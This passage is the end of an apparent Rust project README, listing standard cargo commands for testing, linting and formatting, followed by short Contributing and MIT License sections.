# Run Rust tests
cargo test

# Run Clippy linter
cargo clippy -- -D warnings

# Format code
cargo fmt
```

## Contributing

We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md) for more information.

## License

MIT
